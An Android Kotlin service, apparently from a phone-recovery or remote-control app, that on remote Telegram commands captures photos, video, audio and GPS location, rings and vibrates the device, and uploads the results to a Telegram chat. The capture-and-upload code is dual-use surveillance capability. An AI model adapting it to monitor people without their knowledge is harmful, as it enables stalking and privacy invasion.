package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.*
import android.util.Log
import android.view.SurfaceHolder
import android.view.View
import android.widget.FrameLayout
import android.view.SurfaceView
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import android.content.pm.ServiceInfo
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

class ForegroundActionService : Service() {
    private var exclusiveJob: Job? = null
    private val parallelJobs = mutableSetOf<Job>()
    private var overlayView: View? = null
    private var surfaceHolder: SurfaceHolder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("ForegroundActionService", "onCreate called")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: ""
        val chatId = intent?.getStringExtra("chat_id")
        val commandId = intent?.getLongExtra("command_id", -1L) ?: -1L
        Log.d("ForegroundActionService", "onStartCommand received: action=$action, chatId=$chatId, commandId=$commandId")

        if (isExclusiveAction(action)) {
            if (exclusiveJob?.isActive == true) {
                Log.w("ForegroundActionService", "Service is already running an exclusive command; ignoring new exclusive start command.")
                return START_NOT_STICKY
            }
            exclusiveJob = CoroutineScope(Dispatchers.IO).launch {
                handleExclusiveAction(action, intent, chatId, commandId, startId)
            }
        } else if (isParallelAction(action)) {
            // Each non-exclusive (parallel) action gets its own coroutine and does not block/cancel others
            val job = CoroutineScope(Dispatchers.IO).launch {
                handleParallelAction(action, intent, chatId, commandId, startId)
            }
            synchronized(parallelJobs) { parallelJobs.add(job) }
            job.invokeOnCompletion {
                synchronized(parallelJobs) { parallelJobs.remove(job) }
                // If this was the last running job and no exclusive job, stop service
                if (exclusiveJob?.isActive != true && parallelJobs.isEmpty()) {
                    stopSelf()
                }
            }
        } else {
            Log.w("ForegroundActionService", "Unknown or empty action '$action' sent to ForegroundActionService, stopping self.")
            stopSelfResult(startId)
        }
        return START_NOT_STICKY
    }

    private fun isExclusiveAction(action: String): Boolean =
        action == "photo" || action == "video" || action == "audio"

    private fun isParallelAction(action: String): Boolean =
        action == "location" || action == "ring" || action == "vibrate"

    private suspend fun handleExclusiveAction(
        action: String,
        intent: Intent?,
        chatId: String?,
        commandId: Long,
        startId: Int
    ) {
        try {
            if (!checkPermissionsForAction(action)) {
                Log.e("ForegroundActionService", "Missing permissions for $action")
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this@ForegroundActionService) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Required permissions not granted for $action.")
                }
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                cleanupAndMaybeStop()
                return
            }
            if (action == "photo" || action == "video") {
                val holder = CompletableDeferred<SurfaceHolder?>()
                withContext(Dispatchers.Main) {
                    OverlayHelper.showSurfaceOverlay(this@ForegroundActionService, { holderReady, overlay ->
                        overlayView = overlay
                        if (holderReady?.surface?.isValid == true) {
                            holder.complete(holderReady)
                        } else if (overlay is FrameLayout && overlay.childCount > 0 && overlay.getChildAt(0) is SurfaceView) {
                            val sv = overlay.getChildAt(0) as SurfaceView
                            sv.holder.addCallback(object : SurfaceHolder.Callback {
                                override fun surfaceCreated(sh: SurfaceHolder) {
                                    holder.complete(sh)
                                }
                                override fun surfaceChanged(sh: SurfaceHolder, f: Int, w: Int, h: Int) {}
                                override fun surfaceDestroyed(sh: SurfaceHolder) {}
                            })
                        } else {
                            holder.complete(null)
                        }
                    })
                }
                surfaceHolder = withTimeoutOrNull(2000) { holder.await() }
                if (surfaceHolder == null) {
                    Log.e("ForegroundActionService", "SurfaceHolder not ready, cannot proceed.")
                    if (chatId != null) {
                        val deviceNickname = Preferences.getNickname(this@ForegroundActionService) ?: "Device"
                        UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Unable to create camera surface for $action.")
                    }
                    if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                    cleanupAndMaybeStop()
                    return
                }
            }
            withContext(Dispatchers.Main) { showNotificationForAction(action) }
            when (action) {
                "photo" -> handleCameraAction("photo", intent, chatId, commandId)
                "video" -> handleCameraAction("video", intent, chatId, commandId)
                "audio" -> handleAudioRecording(intent, chatId, commandId)
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Error in action $action", e)
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this@ForegroundActionService) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $action: ${formatDateTime(System.currentTimeMillis())}.")
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        } finally {
            exclusiveJob = null
            cleanupAndMaybeStop()
        }
    }

    private suspend fun handleParallelAction(
        action: String,
        intent: Intent?,
        chatId: String?,
        commandId: Long,
        startId: Int
    ) {
        try {
            withContext(Dispatchers.Main) { showNotificationForAction(action) }
            when (action) {
                "location" -> handleLocation(chatId, commandId)
                "ring" -> handleRing(commandId)
                "vibrate" -> handleVibrate(commandId)
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Error in parallel action $action", e)
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this@ForegroundActionService) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $action: ${formatDateTime(System.currentTimeMillis())}.")
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        }
    }

    private fun checkPermissionsForAction(action: String): Boolean {
        fun has(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
        return when (action) {
            "photo" ->
                has(android.Manifest.permission.CAMERA) &&
                        (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA))
            "video" ->
                has(android.Manifest.permission.CAMERA) &&
                        has(android.Manifest.permission.RECORD_AUDIO) &&
                        (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA)) &&
                        (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE))
            "audio" ->
                has(android.Manifest.permission.RECORD_AUDIO) &&
                        (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE))
            "location" ->
                (has(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
                        has(android.Manifest.permission.ACCESS_COARSE_LOCATION)) &&
                        (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_LOCATION))
            else -> true
        }
    }

    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?, commandId: Long) {
        val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
        val flash = intent?.getBooleanExtra("flash", false) ?: false
        val quality = intent?.getIntExtra("quality", 720) ?: 720
        val duration = intent?.getIntExtra("duration", 60) ?: 60
        val outputFile = File(cacheDir, generateFileName(type, quality))
        val actionTimestamp = System.currentTimeMillis()
        val holder = surfaceHolder
        if (holder == null) {
            Log.e("ForegroundActionService", "SurfaceHolder is null for $type")
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: No camera surface for $type.")
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            return
        }
        val result: Boolean = try {
            CameraBackgroundHelper.takePhotoOrVideo(
                context = this,
                surfaceHolder = holder,
                type = type,
                cameraFacing = cameraFacing,
                flash = flash,
                videoQuality = quality,
                durationSec = duration,
                file = outputFile
            )
        } catch (e: Exception) {
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $type: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            return
        }
        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        if (result && chatId != null) {
            UploadManager.queueUpload(outputFile, chatId, type, actionTimestamp)
        } else if (!result && chatId != null) {
            val deviceNickname = Preferences.getNickname(this) ?: "Device"
            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Failed to capture $type (permission denied or hardware error) at ${formatDateTime(actionTimestamp)}.")
        }
    }

    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?, commandId: Long) {
        val duration = intent?.getIntExtra("duration", 60) ?: 60
        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
        val actionTimestamp = System.currentTimeMillis()
        try {
            AudioBackgroundHelper.recordAudio(this, outputFile, duration)
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            if (chatId != null) {
                UploadManager.queueUpload(outputFile, chatId, "audio", actionTimestamp)
            }
        } catch (e: Exception) {
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in audio recording: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        }
    }

    private fun handleRing(commandId: Long) {
        val duration = 5
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
            val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
            ringtone.play()
            Handler(Looper.getMainLooper()).postDelayed({
                ringtone.stop()
                audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            }, (duration * 1000).toLong())
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Ring error: $e")
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        }
    }

    private fun handleVibrate(commandId: Long) {
        val duration = 2000L
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(duration)
            }
            Handler(Looper.getMainLooper()).postDelayed({
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            }, duration)
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Vibrate error: $e")
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        }
    }

    private suspend fun handleLocation(chatId: String?, commandId: Long) {
        val actionTimestamp = System.currentTimeMillis()
        try {
            val loc = LocationBackgroundHelper.getLastLocation(this)
            if (loc == null) {
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Location unavailable (GPS off, permission denied, or no recent fix) at ${formatDateTime(actionTimestamp)}.")
                }
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                return
            }
            val locationFile = File(cacheDir, "location_${nowString()}.json")
            FileOutputStream(locationFile).use { out ->
                out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            if (chatId != null) {
                UploadManager.queueUpload(locationFile, chatId, "location", actionTimestamp)
            }
        } catch (e: Exception) {
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in location service: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        }
    }

    override fun onDestroy() {
        exclusiveJob?.cancel()
        exclusiveJob = null
        synchronized(parallelJobs) {
            parallelJobs.forEach { it.cancel() }
            parallelJobs.clear()
        }
        cleanupAndMaybeStop(force = true)
        super.onDestroy()
    }

    private fun cleanupAndMaybeStop(force: Boolean = false) {
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                overlayView?.let { OverlayHelper.removeOverlay(this, it) }
            } catch (_: Exception) {}
            surfaceHolder = null
            overlayView = null
        }
        // Stop the service if nothing is running, or if forced (onDestroy)
        if (force || (exclusiveJob == null && parallelJobs.isEmpty())) {
            stopSelf()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun showNotificationForAction(action: String) {
        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Remote Control Service")
            .setContentText("Running background actions...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        val type =
            when (action) {
                "photo" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                "video" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                "audio" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                "location" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                else -> 0
            }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && type != 0) {
            try {
                startForeground(1, notification, type)
            } catch (e: SecurityException) {
                Log.e("ForegroundActionService", "SecurityException: ${e.message}")
                cleanupAndMaybeStop(force = true)
                stopSelf()
                return
            }
        } else {
            startForeground(1, notification)
        }
    }

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, ForegroundActionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, ForegroundActionService::class.java))
        }
        fun isRunning(context: Context): Boolean = false

        fun startCameraAction(
            context: Context,
            type: String,
            options: JSONObject,
            chatId: String?,
            commandId: Long
        ) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", type)
            intent.putExtra("camera", options.optString("camera", "rear"))
            if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
            if (type == "video" || type == "photo") {
                if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
            }
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startAudioAction(context: Context, options: JSONObject, chatId: String?, commandId: Long) {
            val duration = options.optInt("duration", 60)
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "audio")
            intent.putExtra("duration", duration)
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startLocationAction(context: Context, chatId: String?, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "location")
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startRingAction(context: Context, options: JSONObject, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "ring")
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startVibrateAction(context: Context, options: JSONObject, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "vibrate")
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun generateFileName(type: String, quality: Int): String {
            val sdf = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US)
            return if (type == "video") {
                "${type}_${quality}p_${sdf.format(java.util.Date())}.mp4"
            } else {
                "${type}_${sdf.format(java.util.Date())}.jpg"
            }
        }
        fun nowString(): String = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
    }
}